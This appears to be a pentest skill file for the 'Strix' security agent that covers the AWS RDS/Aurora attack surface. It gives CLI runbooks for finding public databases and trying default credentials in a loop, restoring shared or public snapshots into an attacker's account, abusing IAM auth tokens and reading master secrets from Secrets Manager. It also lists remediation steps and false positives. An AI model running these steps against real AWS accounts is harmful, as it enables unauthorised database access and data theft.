---
name: aws-rds-attack-surface
description: RDS / Aurora misconfigurations — public DB, snapshot share, IAM auth bypass, parameter-group abuse
triggers: [rds, aurora, db cluster, db snapshot, db parameter group, iam database authentication, public db, rds proxy]
---

# AWS RDS / Aurora Attack Surface

RDS combines two trust boundaries: network reachability (security group + public-access flag + subnet routing) and database authentication (master password, IAM auth, secrets-manager rotation). Bugs cluster around inadvertently public clusters, shared snapshots, weak parameter-group settings, and master-credential leakage via Secrets Manager misconfig.

Strix's `cloud_attack_paths/patterns.py` ships `_pattern_public_database` and related RDS patterns. Companion to `live_probes.py` for handshake-confirmation.

## Attack Surface

### Public-access flag
- `PubliclyAccessible: true` on an RDS instance puts it on a public IP
- Still gated by VPC + security group, but the entry point exists
- Bug: SG rule allows `0.0.0.0/0` on port 3306 / 5432 / 1433 — combined with public access = world-reachable DB

### Subnet routing
- RDS in a public subnet + IGW + `0.0.0.0/0` SG → reachable
- RDS in a private subnet → only reachable from within VPC; bug requires a pivot point inside

### IAM database authentication
- Alternative to master password — IAM principal authenticates via token
- Bug: any principal with `rds-db:connect` on the resource can authenticate without knowing the master password
- Token TTL: 15 minutes; reused = replay

### Snapshot sharing
- Manual snapshots can be shared cross-account via `aws rds modify-db-snapshot-attribute`
- `RestoreFromSnapshot` recreates the DB with the same data
- Public snapshots (`Public: true`) = anyone can restore = data leak

### Parameter groups
- DB-level settings; some are dangerous
  - `log_statement = all` + over-broad CloudWatch read → SQL queries logged + readable
  - `rds.force_ssl = 0` (Postgres) → MITM-capable
  - `local_infile = 1` (MySQL) → CSV injection / LOAD DATA LOCAL abuse
  - `enable_user_activity_logging` (Redshift) — leaks queries to S3 audit bucket

### Master credentials
- Stored in Secrets Manager when `MasterUserSecretKmsKeyId` is set (Aurora) — read-controlled via KMS + secrets policy
- Older deployments: stored in env vars / hardcoded in IaC templates / leaked in CloudWatch logs

## Detection Channels

### Public-access sweep

```bash
# List all DB instances with public access
aws rds describe-db-instances \
  --query 'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address,Endpoint.Port,VpcSecurityGroups[].VpcSecurityGroupId]' \
  --output table
```

### SG inspection

```bash
# Walk SG rules attached to a DB
SG=$(aws rds describe-db-instances --db-instance-identifier <DB> \
     --query 'DBInstances[0].VpcSecurityGroups[0].VpcSecurityGroupId' --output text)
aws ec2 describe-security-groups --group-ids "$SG" \
  --query 'SecurityGroups[0].IpPermissions[?ToPort>=`3306` && FromPort<=`5432`]'
```

### Snapshot sharing

```bash
# Public snapshots (anyone can restore)
aws rds describe-db-snapshots --include-public \
  --query 'DBSnapshots[?DBSnapshotIdentifier!=`null`] | [?contains(DBSnapshotArn, `:public:`)]'

# Cross-account snapshots
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <SNAP>
```

### Endpoint reachability

```bash
# From a remote vantage:
nc -zv <RDS_ENDPOINT> 5432
nc -zv <RDS_ENDPOINT> 3306

# Probe service banner without authentication
nmap -sV -p 3306,5432,1433 <RDS_ENDPOINT>
```

## Operational Runbook

### Step 1 — discover

```bash
strix --target aws://<ACCOUNT> --target-type cloud_account
# Output includes RDS instance nodes in cloud_attack_paths/graph.py
```

### Step 2 — public-DB sweep

```bash
# Strix's _pattern_public_database flags this automatically; manual:
aws rds describe-db-instances --query \
  'DBInstances[?PubliclyAccessible==`true` && DBInstanceStatus==`available`]' \
  --output json | jq -r '.[] | "\(.DBInstanceIdentifier) \(.Endpoint.Address):\(.Endpoint.Port)"'
```

### Step 3 — handshake confirmation

```bash
# Just confirming TCP reachability is the SG status; need a real probe for "vulnerable"
# Postgres
psql "host=<ENDPOINT> port=5432 user=postgres" -c '\l' 2>&1 | head

# MySQL
mysql -h <ENDPOINT> -u root -e 'SELECT @@version;' 2>&1 | head

# Try common default users
for user in postgres admin master root rdsadmin awsadmin; do
  echo "user=$user"
  PGPASSWORD='password' psql "host=<ENDPOINT> port=5432 user=$user dbname=postgres" -c '\l' 2>&1 | head -2
done
```

Often the master password is left as the IaC-default; `Postgres123!` and `admin123` show up in real engagements.

### Step 4 — IAM database authentication abuse

```bash
# If you have rds-db:connect IAM permission against the DB
TOKEN=$(aws rds generate-db-auth-token \
        --hostname <ENDPOINT> \
        --port 5432 \
        --region <REGION> \
        --username <IAM_DB_USER>)

# Use the token as password
PGPASSWORD="$TOKEN" psql "host=<ENDPOINT> sslmode=require user=<IAM_DB_USER> dbname=<DB>"
```

No master password needed; the IAM grant IS the password.

### Step 5 — snapshot restore abuse

```bash
# When you can restore a snapshot, you get the data — even if production access is locked down

# Find shared / public snapshots
aws rds describe-db-snapshots --include-public --include-shared \
  --query 'DBSnapshots[].DBSnapshotIdentifier'

# Restore into your own account
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier strix-restored \
  --db-snapshot-identifier <SHARED_SNAPSHOT_ARN> \
  --db-instance-class db.t3.small \
  --publicly-accessible

# Connect to your restored instance
aws rds describe-db-instances --db-instance-identifier strix-restored
psql "host=<RESTORED_ENDPOINT> user=master dbname=postgres"
```

The restored instance contains every byte of the original. Clean up after.

### Step 6 — parameter-group abuse

```bash
# Check for dangerous parameters
aws rds describe-db-parameters --db-parameter-group-name <PG_NAME> \
  --query 'Parameters[?ParameterName==`log_statement` || ParameterName==`local_infile`]'
```

When `local_infile=1` on MySQL: any SQLi finding pivots to LOAD DATA LOCAL INFILE → reading server-side files.

### Step 7 — Secrets Manager + RDS

```bash
# Aurora's MasterUserSecretArn — points to a Secrets Manager secret
SECRET_ARN=$(aws rds describe-db-clusters --db-cluster-identifier <CLUSTER> \
             --query 'DBClusters[0].MasterUserSecret.SecretArn' --output text)

# If you have secretsmanager:GetSecretValue on this secret:
aws secretsmanager get-secret-value --secret-id "$SECRET_ARN" --query 'SecretString'
# JSON with username + password; instant master-password access.
```

## Specific Vulnerability Classes

### Aurora Serverless v1 Data API
- `aws rds-data execute-statement` runs SQL against Aurora via HTTPS API
- Bug: principal with `rds-data:ExecuteStatement` doesn't need to know the master password — the API uses IAM
- Misconfigured permissions → mass data extraction via the API

### RDS Proxy session-credential reuse
- RDS Proxy holds open connections + reuses them across IAM principals
- Bug: misconfigured `IAMAuth` on the proxy → one principal's session reused for another's query

### Snapshot encryption-key share
- Cross-account snapshots carry the KMS key reference
- If the destination account doesn't have decrypt on the key, restore fails — but the snapshot METADATA still leaks (DB name, size, engine, last-modified)

### Read-replica chain
- Read replicas can be in different VPCs / subnets
- Bug: the master is private but a replica is `PubliclyAccessible: true` — same data, different exposure

## Validation

1. Public-reachable: `nc -zv <ENDPOINT> <PORT>` succeeds from a non-VPC source.
2. Default-creds: connect with a common default username + password.
3. IAM-auth abuse: generate token + connect from an unauthorised principal.
4. Snapshot restore: successfully restore a shared/public snapshot in your account.
5. Document: instance identifier, endpoint, SG rules, public flag, snapshot share state.

## False Positives

- DB reachable but auth is enforced; finding is "network-exposed" not "compromise". Lower severity.
- Snapshot shared with a *trusted* sister account (verify with operator).
- `PubliclyAccessible: true` but SG only allows specific bastion IPs — confirm SG inbound rules.
- Older RDS instances stuck on `pending-modify` state — finding may resolve on next maintenance window.

## Impact

- Direct DB read/write — most catastrophic data exposure class.
- Cross-account data exfil via snapshot share.
- Encryption-at-rest bypass via cross-account snapshot + own-account decrypt key.
- Persistence — attacker creates a DB user that survives password rotations.

## Remediation

1. **`PubliclyAccessible: false`** on every RDS instance unless explicitly justified.
2. **Tight SG rules**: only specific VPC CIDRs / SGs, never `0.0.0.0/0`.
3. **No public snapshots**: enforce via SCP `DENY rds:ModifyDBSnapshotAttribute` when `attribute=restore` + `values=all`.
4. **IAM database authentication** instead of master password where possible — short-lived tokens, IAM-audited.
5. **RDS Proxy with IAM auth + Secrets Manager** for application connections — rotates credentials transparently.
6. **`rds.force_ssl = 1`** + `require_secure_transport = 1` — block plaintext connections.
7. **CloudTrail rule for `rds:RestoreDBInstanceFromDBSnapshot`** — restoration from shared snapshots is a high-fidelity exfil signal.

## Pro Tips

1. The `aws rds describe-db-snapshots --include-public` query is gold — public snapshots are often forgotten test data.
2. RDS endpoints follow predictable patterns: `<id>.<random>.<region>.rds.amazonaws.com`. Org-wide DNS enumeration sometimes reveals them.
3. Read-replicas often inherit different SG / public-access settings than the master — audit each separately.
4. Snapshot metadata leaks DB engine + size + last-modified, even without restore access. Useful for fingerprinting before exploitation.
5. The Data API surface (Aurora Serverless v1) is a different exposure tier from the SQL port — audit `rds-data:*` IAM permissions separately.

## Summary

RDS exposure is network + auth + share. Public flag is the most common bug; SG over-permissive is the second; shared snapshots and weak parameter groups round out the top four. Default credentials still work on a depressing number of internal RDS deployments.
